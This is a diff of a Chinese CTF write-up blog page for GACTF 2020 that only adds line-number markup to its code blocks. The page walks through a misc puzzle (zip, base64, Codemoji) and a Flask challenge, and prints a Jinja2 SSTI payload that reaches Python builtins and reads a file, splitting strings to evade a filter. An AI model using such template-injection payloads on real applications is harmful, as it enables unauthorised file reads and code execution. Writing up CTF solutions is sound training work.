@@ -546,19 +546,19 @@
 </blockquote>
 <p>下载下来一个 <code>crymisc.docx</code>，一看打不开果然改成 zip，发现有伪加密。</p>
 <p><code>1.txt</code> 内容为：</p>
-<pre class="language-none"><code class="language-none">I'm going to tell her how i feel.DO YOU WANT TO KNOW WHAT I TOLD HER?</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">I'm going to tell her how i feel.DO YOU WANT TO KNOW WHAT I TOLD HER?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>另外是一张图片，发现结尾有东西，至少有个压缩包。</p>
 <p><img src="/2020/08/31/CTF_2020GACTF/3.jpg" alt="3"></p>
 <p><img src="/2020/08/31/CTF_2020GACTF/image-20200830160506078.png" alt="3.jpg"></p>
 <p>提取出来。</p>
-<pre class="language-none"><code class="language-none">SSB3YXMgcmVqZWN0ZWQuLi4uLi5USElTIElTIFRIRSBQQVNTV09SRDpJIFdhbm5hIENyeXl5ISEh</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">SSB3YXMgcmVqZWN0ZWQuLi4uLi5USElTIElTIFRIRSBQQVNTV09SRDpJIFdhbm5hIENyeXl5ISEh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>首先对上面这段 base64，得到压缩包密码。</p>
-<pre class="language-none"><code class="language-none">I was rejected......THIS IS THE PASSWORD:I Wanna Cryyy!!!</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">I was rejected......THIS IS THE PASSWORD:I Wanna Cryyy!!!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>压缩包需要先补上文件头，即变成 504B0304…</p>
 <p><img src="/2020/08/31/CTF_2020GACTF/image-20200830160819061.png" alt="zip"></p>
 <p>拿密码去解压，文件内容如下。</p>
-<pre class="language-none"><code class="language-none">🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕
-That is what i told her↑↑↑</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕
+That is what i told her↑↑↑<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><strong>什么，您就是抽象带师？</strong></p>
 <p>想起来在 BJD3rd 里 TaQini 师傅就出过一题，就是 <a href="https://miaotony.xyz/2020/05/24/CTF_BJDCTF3rd/#manual">Manual 这题的一部分</a>。</p>
 <p>参考<a href="https://miaotony.xyz/2020/05/24/CTF_BJDCTF3rd/#manual">那题的思路</a>，盲猜就是 Codemoji 了！根据提示key应该就是个哭的表情吧，就😭这个了。</p>
@@ -569,14 +569,14 @@ That is what i told her↑↑↑</code></pre>
 <p><strong>就在这里了！</strong>-&gt; <a target="_blank" rel="noopener" href="https://codemoji.miaotony.xyz/">https://codemoji.miaotony.xyz</a></p>
 <p><em>欢迎来玩呀（</em></p>
 <p>于是构造 payload 如下：</p>
-<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕"</span><span class="token punctuation">,</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"😭"</span><span class="token punctuation">}</span></code></pre>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕"</span><span class="token punctuation">,</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"😭"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>base64encode + URLencode：</p>
-<pre class="language-none"><code class="language-none">eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>而后丢去解密。</p>
 <p><a target="_blank" rel="noopener" href="https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J+UrfCfkpnwn5Cw4pyK8J+Mu/CfkKfwn5KZ8J+YmPCfjLvwn4228J+SkPCfjYzwn4+K8J+NqfCfmoHwn4+K8J+RufCfkLbwn5iA8J+QtvCfmIDwn5iY8J+RufCfkpnwn42C8J+Sh/CfmIDwn5iA8J+YqfCfjLvwn42f8J+RgvCfjbbwn5KQ8J+NjPCfj4rwn42p8J+RhvCfj6Dwn5mH8J+NgvCfjYLwn5G88J+YsfCfmpTwn5C28J+RieKcivCfmLHwn4+g8J+Zh/CfjYLwn42C8J+RvPCfmLHwn5qK8J+Yp/Cfkqjwn5KZ8J+SlSIsImtleSI6IvCfmK0ifQ==">https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D</a></p>
 <p>得到flag。</p>
 <p><img src="/2020/08/31/CTF_2020GACTF/image-20200830161359128.png" alt="flag"></p>
-<pre class="language-none"><code class="language-none">WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><blockquote>
 <p>题目每10分钟重启，如遇到无法连接，请稍等片刻10秒左右会全部重启完毕<br> This topic restart every 10 minitues. If you can’t connect, please wait  for a while and the restart will be completed. Do not panic</p>
@@ -603,7 +603,7 @@ That is what i told her↑↑↑</code></pre>
 <p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155932359.png" alt="read"></p>
 <p>最后问了队里大师傅，发现换成<code>open</code>就完事了，太草了！</p>
 <p><strong>Payload:</strong></p>
-<pre class="language-none"><code class="language-none">name={{[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["op""en"]("/fl""ag").read()}}</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">name={{[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["op""en"]("/fl""ag").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/2020/08/31/CTF_2020GACTF/image-20200830154108093.png" alt="flag"></p>
 <p><code>GACTF{fac9165b6a2b5ac8bd3b99fad0619366}</code></p>
 <p>后面再整理一下 flask 的 SSTI 常用 payload 及绕过技巧吧（</p>
@@ -612,7 +612,7 @@ That is what i told her↑↑↑</code></pre>
 <p>flask&amp;flask</p>
 <p>China：<br> 124.70.206.91 10000-10009<br> Overseas：<br> 149.28.226.175 10000-10009</p>
 </blockquote>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
 <span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
 <span class="token keyword">import</span> requests
 <span class="token keyword">from</span> waf <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -635,12 +635,12 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token comment"># admin requests</span>
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>他这个 flask 服务器为 Werkzeug/1.0.1 Python/2.7.18。</p>
 <p>访问 <code>/ctfhint</code>，得到</p>
-<pre class="language-none"><code class="language-none">too young too simple</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">too young too simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>POST <code>/eval</code></p>
-<pre class="language-none"><code class="language-none">post eval</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">post eval<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>没找到哪里能用？</p>
 <p><code>admin</code> 没找到 route 在哪，并不知道怎么用 emmm。</p>
 <p><em>（等复现嘤嘤嘤</em></p>
